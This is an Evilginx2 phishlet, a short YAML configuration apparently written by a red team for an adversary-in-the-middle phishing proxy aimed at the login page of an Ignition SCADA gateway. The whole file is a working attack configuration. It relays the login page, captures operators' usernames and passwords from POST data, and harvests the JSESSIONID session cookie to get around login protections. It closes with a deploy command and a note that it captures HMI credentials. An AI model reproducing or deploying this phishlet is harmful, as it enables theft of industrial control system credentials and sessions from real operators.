# Evilginx2 phishlet for Ignition SCADA

name: 'ignition'
author: '@icsredteam'
min_ver: '2.4.0'

proxy_hosts:
  - {phish_sub: 'scada', orig_sub: '', domain: 'company.com', session: true, is_landing: true}

sub_filters:
  - {triggers_on: 'scada.company.com', orig_sub: '', domain: 'company.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json']}

auth_tokens:
  - domain: '.company.com'
    keys: ['JSESSIONID']

credentials:
  username:
    key: 'username'
    search: '(.*)'
    type: 'post'
  password:
    key: 'password'
    search: '(.*)'
    type: 'post'

login:
  domain: 'scada.company.com'
  path: '/system/gateway/j_security_check'

# Deploy: evilginx2 -p phishlets/ignition.yaml
# Capture HMI credentials when operator logs in via phishing link
